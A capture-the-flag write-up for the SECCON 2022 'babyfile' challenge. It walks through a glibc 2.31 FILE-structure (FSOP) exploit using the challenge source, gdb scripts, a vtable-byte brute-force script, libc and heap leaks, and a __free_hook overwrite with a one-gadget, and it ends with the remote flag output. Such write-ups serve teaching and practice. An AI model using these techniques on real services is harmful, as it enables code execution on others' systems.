## Babyfile task

Description:

```
Play with FILE structure!!

nc babyfile.seccon.games 3157

babyfile.tar.gz 5b87765ce146086ac72f873bd2f3104db64a57d1
```

## Writeup

In this challenge we received both the binary and its source code:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

static int menu(void);
static int getnline(char *buf, int size);
static int getint(void);

#define write_str(s) write(STDOUT_FILENO, s, sizeof(s)-1)

int main(void){
	FILE *fp;

	alarm(30);

	write_str("Play with FILE structure\n");

	if(!(fp = fopen("/dev/null", "r"))){
		write_str("Open error");
		return -1;
	}
	fp->_wide_data = NULL;

	for(;;){
		switch(menu()){
			case 0:
				goto END;
			case 1:
				fflush(fp);
				break;
			case 2:
				{
					unsigned char ofs;
					write_str("offset: ");
					if((ofs = getint()) & 0x80)
						ofs |= 0x40;
					write_str("value: ");
					((char*)fp)[ofs] = getint();
				}
				break;
		}
		write_str("Done.\n");
	}

END:
	write_str("Bye!");
	_exit(0);
}

static int menu(void){
	write_str("\nMENU\n"
			"1. Flush\n"
			"2. Trick\n"
			"0. Exit\n"
			"> ");

	return getint();
}

static int getnline(char *buf, int size){
	int len;

	if(size <= 0 || (len = read(STDIN_FILENO, buf, size-1)) <= 0)
		return -1;

	if(buf[len-1]=='\n')
		len--;
	buf[len] = '\0';

	return len;
}

static int getint(void){
	char buf[0x10] = {};

	getnline(buf, sizeof(buf));
	return atoi(buf);
}
```

We can see here that we can do one of three things: execute a `fflush(fp)` or overwrite some offsets in the allocated `FILE*` structure or exit the program.

So this challenge is about exploitin the glibc's file structure vtable pointer. Since the glibc used (2.31 from ubuntu 20.04, which we received in the task zip) has checks for the vtable field, whether it lies in a special glibc section that contains the file vtable entries, we can't set vtable to arbitrary address.
Actually, an additional difficulty for that would be the fact that the binary has full PIE and we do not have any information leak, so we do not know the pointers in there:

```
dc@ubuntu:~/seccon2022quals/pwn_babyfile/babyfile$ pwn checksec chall
[*] '/home/dc/seccon2022quals/pwn_babyfile/babyfile/chall'
    Arch:     amd64-64-little
    RELRO:    Full RELRO
    Stack:    Canary found
    NX:       NX enabled
    PIE:      PIE enabled
```

However, since we can overwrite any byte on specific offsets of the FILE struct (some offsets are blocked by the logic in there, iirc we can write to offsets [0, 127] and [196, 255] - please note that 255 is actually past the FILE struct as it has a size of 224 bytes iirc), we can actually overwrite it partially and make so that `fflush()` will call an unexpected function from libc file functions.

And this is the clue for the task.

We knew that to exploit the program, we will need two things: 1) an info leak, 2) a write primitive.

In order to achieve that, we wanted to make so that `fflush()` would behave as if it was a `puts()` call and as if the buffer it is supposed to read from is controlled by us, e.g. to some heap buffer.

To achieve that, we initially looked into the file structure owned by the program. For this, we used some gdb scripting with Pwndbg + Pwntools:

```
# Break after fopen
breakrva 0x1268
continue
# set useful variables
set $ff=(struct _IO_FILE_plus*)$rax
set $f=(FILE*)$rax
set $vt=((struct _IO_FILE_plus*)$rax)->vtable
# And aliases to dereference them
alias ff=p *$f
alias fff=p *$ff
alias vt=p *$vt
```

With this script, the program stopped after `fopen` and we were able to fetch the pointer to the file structure and then we created some aliases that helped us inspect the state of the `FILE` structure.

Here is this state just after `fopen`:

```
pwndbg> fff
$1 = {
  file = {
    _flags = -72539000,
    _IO_read_ptr = 0x0,
    _IO_read_end = 0x0,
    _IO_read_base = 0x0,
    _IO_write_base = 0x0,
    _IO_write_ptr = 0x0,
    _IO_write_end = 0x0,
    _IO_buf_base = 0x0,
    _IO_buf_end = 0x0,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x7fa6d0dbd5c0 <_IO_2_1_stderr_>,
    _fileno = 3,
    _flags2 = 0,
    _old_offset = 0,
    _cur_column = 0,
    _vtable_offset = 0 '\000',
    _shortbuf = "",
    _lock = 0x5579be07c380,
    _offset = -1,
    _codecvt = 0x0,
    _wide_data = 0x5579be07c390,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0,
    _mode = 0,
    _unused2 = '\000' <repeats 19 times>
  },
  vtable = 0x7fa6d0db94a0 <_IO_file_jumps>
}
```

We can see that all `_IO_*` pointers are set to NULL and they are used for things like "print stuff from buffer".
So we wanted to find a way to allocate them somehow. 
Of course we could just fill them in with the out of bounds write given to us in the "Trick" option, but since we do not know any pointers in the program memory this is useless for now.

So how do we allocate it? 
Well, we went for looking into glibc code to see which vtable function would be useful for that, but... 
We also wrote a simple script to brute force it by guessing the value to partially overwrite the vtable pointer to see if the vtable function that will be executed by `fflush` will change the pointers stored in the `FILE` struct:

```python
for byte in range(0xa8+8, 0xff, 8):
    with start(timeout=2) as io:
        if args.API:
            io.gdb.execute('continue')
        print("Overwriting last vtable byte with = %#x" % byte)
        write(216, p8(byte))

        flush()

        try:
            exit()
        except EOFError:
            print("CRASHED")
            continue

        must_change = """
    _IO_read_ptr = 0x0,
    _IO_read_end = 0x0,
    _IO_read_base = 0x0,
    _IO_write_base = 0x0,
    _IO_write_ptr = 0x0,
    _IO_write_end = 0x0,
    _IO_buf_base = 0x0,
    _IO_buf_end = 0x0,
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,"""

        if args.API:
            x = io.gdb.execute('fff', to_string=True)
            assert isinstance(x, str)
            print(byte, x)

            if must_change in x:
                io.gdb.quit()  # exit gdb
                continue
            else:
                print("CHANGED!!!")
                asdf  # Crash script to get notified :)
```

This script would have to be launched with `python3 solve.py GDB LOCAL DEBUG API` so that it works properly.

This gave us a structure like this:

```
pwndbg> fff
$2 = {
  file = {
    _flags = -72538968,
    _IO_read_ptr = 0x0,
    _IO_read_end = 0x0,
    _IO_read_base = 0x0,
    _IO_write_base = 0x0,
    _IO_write_ptr = 0x0,
    _IO_write_end = 0x0,
    _IO_buf_base = 0x5579be07c480 "",
    _IO_buf_end = 0x5579be07d47f "",
    _IO_save_base = 0x0,
    _IO_backup_base = 0x0,
    _IO_save_end = 0x0,
    _markers = 0x0,
    _chain = 0x7fa6d0dbd5c0 <_IO_2_1_stderr_>,
    _fileno = 3,
    _flags2 = 0,
    _old_offset = 0,
    _cur_column = 0,
    _vtable_offset = 0 '\000',
    _shortbuf = "",
    _lock = 0x5579be07c380,
    _offset = -1,
    _codecvt = 0x0,
    _wide_data = 0x0,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0,
    _mode = 0,
    _unused2 = '\000' <repeats 19 times>
  },
  vtable = 0x7fa6d0db9488
}
```

Where we can see that we got the `_IO_buf_base` and `_IO_buf_end` allocated. 
We used the same brute force method to get more pointers allocated from this state.

This then gave us a structure like this:

```
pwndbg> fff
$4 = {
  file = {
    _flags = -72534616,
    _IO_read_ptr = 0x5579be07d50f "\200",
    _IO_read_end = 0x5579be07d590 "",
    _IO_read_base = 0x5579be07d490 "",
    _IO_write_base = 0x5579be07c470 "`\217\333Ц\177",
    _IO_write_ptr = 0x5579be07c4ff "",
    _IO_write_end = 0x5579be07c480 "",
    _IO_buf_base = 0x5579be07c480 "",
    _IO_buf_end = 0x5579be07d47f "",
    _IO_save_base = 0x5579be07c480 "",
    _IO_backup_base = 0x5579be07d510 "",
    _IO_save_end = 0x5579be07c480 "",
    _markers = 0x0,
    _chain = 0x7fa6d0dbd5c0 <_IO_2_1_stderr_>,
    _fileno = 1,
    _flags2 = 0,
    _old_offset = 0,
    _cur_column = 0,
    _vtable_offset = 0 '\000',
    _shortbuf = "",
    _lock = 0x5579be07c380,
    _offset = -1,
    _codecvt = 0x0,
    _wide_data = 0x0,
    _freeres_list = 0x0,
    _freeres_buf = 0x0,
    __pad5 = 0,
    _mode = 0,
    _unused2 = '\000' <repeats 19 times>
  },
  vtable = 0x7fa6d0db94a0 <_IO_file_jumps>
}
```

And here is when the fun begin. Now, we have lots of pointers that we can interact with in different vtable functions, so now we had to find this one function that will either give us RCE or print us some data.

Tbh RCE at this point is hard: we still have no memory leak and we do not know where to jump to. Those buffer pointers are also pointing to the heap.

Since we wanted to "print something" and "fflush" is supposed to clear the buffers and actually print something, we fixed the vtable pointer offset to its original value.
Then, by calling and debugging through `fflush`, we found out that it calls `_IO_new_file_sync` which has this logic:

```
     ► 798   if (fp->_IO_write_ptr > fp->_IO_write_base)
       799     if (_IO_do_flush(fp)) return EOF;
```

And our values were:

```
        pwndbg> p fp
        $2 = (FILE *) 0x55efb23f92a0
        pwndbg> p fp->_IO_write_ptr
        $3 = 0x55efb23f9480 ""
        pwndbg> p fp->_IO_write_base
        $4 = 0x55efb23f9480 ""
```

So we changed the `_IO_write_ptr` with the out of bounds write in "Trick" so we could trigger the `_IO_do_flush`.
Then we run the program again to see what will happen and stepped through it.

We found that  the `_IO_do_flush` actually calls to `_IO_file_sync` which then calls to `_IO_do_write` with the FILE pointer as the first arg:

```
     ► 0x7f2c716c4473 <_IO_file_sync+179>    call   _IO_do_write                <_IO_do_write>
        rdi: 0x55efb23f92a0 ◂— 0xfbad25a8
        rsi: 0x55efb23f9480 ◂— 0x0
        rdx: 0x7f
        rcx: 0x0
```

This `_IO_do_write` eventually called `new_do_write`:

```
   422 int
   423 _IO_new_do_write (FILE *fp, const char *data, size_t to_do)
 ► 424 {
   425   return (to_do == 0
   426 	  || (size_t) new_do_write (fp, data, to_do) == to_do) ? 0 : EOF;
   427 }
   428 libc_hidden_ver (_IO_new_do_write, _IO_do_write)
```

Which looks like this:

```c
 430 static size_t
 431 new_do_write (FILE *fp, const char *data, size_t to_do)
 432 {
 433   size_t count;
 434   if (fp->_flags & _IO_IS_APPENDING)
 435     /* On a system without a proper O_APPEND implementation,
 436        you would need to sys_seek(0, SEEK_END) here, but is
 437        not needed nor desirable for Unix- or Posix-like systems.
 438        Instead, just indicate that offset (before and after) is
 439        unpredictable. */
 440     fp->_offset = _IO_pos_BAD;
 441   else if (fp->_IO_read_end != fp->_IO_write_base)
 442     {
 443       off64_t new_pos
 444     = _IO_SYSSEEK (fp, fp->_IO_write_base - fp->_IO_read_end, 1);
 445       if (new_pos == _IO_pos_BAD)
 446     return 0;
 447       fp->_offset = new_pos;
 448     }
 449   count = _IO_SYSWRITE (fp, data, to_do);
 450   if (fp->_cur_column && count)
 451     fp->_cur_column = _IO_adjust_column (fp->_cur_column - 1, data, count) + 1;
 452   _IO_setg (fp, fp->_IO_buf_base, fp->_IO_buf_base, fp->_IO_buf_base);
 453   fp->_IO_write_base = fp->_IO_write_ptr = fp->_IO_buf_base;
 454   fp->_IO_write_end = (fp->_mode <= 0
 455                && (fp->_flags & (_IO_LINE_BUF | _IO_UNBUFFERED))
 456                ? fp->_IO_buf_base : fp->_IO_buf_end);
 457   return count;
 458 }
```

We can see here the `_IO_SYSWRITE` - this is another vtable call actually but since vtable is correct it will call `_IO_new_file_write` which eventually calls the `write` syscall:

```c
    1173 _IO_new_file_write (FILE *f, const void *data, ssize_t n)
    1174 {
    1175   ssize_t to_do = n;
    1176   while (to_do > 0)
    1177     {
    1178       ssize_t count = (__builtin_expect (f->_flags2
    1179                                          & _IO_FLAGS2_NOTCANCEL, 0)
    1180                ? __write_nocancel (f->_fileno, data, to_do)
    1181                : __write (f->_fileno, data, to_do));
    1182       if (count < 0)
    1183     {
    1184       f->_flags |= _IO_ERR_SEEN;
    1185       break;
    1186     }
    1187       to_do -= count;
    1188       data = (void *) ((char *) data + count);
    1189     }
    1190   n -= to_do;
    1191   if (f->_offset >= 0)
    1192     f->_offset += n;
    1193   return n;
    1194 }
```

For this to get a leak, we had to set the state of the FILE properly, also finding an offset on the heap the FILE buffers were pointing to so that we obtained a meaningful pointer leak.

With this, we were able to get a libc leak.

At this point, we thought that we could maybe use the "FSOP gadgets" exploitation technique, so we ran a binary ninja plugin to dump the fsop gadgets and we tried to see if any of them would work. 
Sadly, all of them seemed to require us to be able to write to the `wide_data` member of the `FILE` structure and this wasn't possible as the "Trick" out of bounds write was limited.

So we went with different approach. We used the same technique to leak a heap pointer and then we were looking for an arbitrary memory write to overwrite a free/malloc hook.

This step took us long time of 1) debugging and 2) looking into libc file code to find a place where we actually could do an arbitrary write.

We had found this `save_for_backup` function which allowed us to do some kind of `memcpy(...)` or `memmove(...)` with controlled addresses and we backtracked it to a vtable entry we could call.

We then spent some time on getting all the required state conditions to be met and we finally overwritten the free hook. 
We overwritten it with a libc one gadget value (an address to which if you jump, you will get a shell if some conditions are met).

We tried all the gadgets and we found one that actually worked.

We then ran the exploit on remote and got the flag:

```
root@CTF-ubuntu-s-1vcpu-1gb-intel-sgp1-01:~# python3 solv.py REMOTE I=1
[+] Opening connection to babyfile.seccon.games on port 3157: Done
Overwriting last vtable byte with = 0x88 to set fp.file->_IO_buf_base/end
Overwriting last vtable byte with = 0x60, to set all _IO_{read,write,buf,*} ptrs
Fixing vtable to its correct value
VTABLE PTR: 0x7f7b9041ef60
LIBC BASE : 0x7f7b90236000
HEAP BASE: 0x563ac6ddd000
FILE ADDR: 0x563ac6ddd2a0
GADGET EA: 0x7f7b90319b01
WRITE TO: 0x7f7b90424e48
[*] Switching to interactive mode
SECCON{r34d_4nd_wr173_4nywh3r3_w17h_f1l3_57ruc7ur3}
[*] Got EOF while reading in interactive
```

* Oh, also, we had troubles with our exploit timing out on remote, but we switched to a VPS in Singapore and then it worked.. :)

The full exploit for this challenge can be found in the [solve.py](solve.py) file.
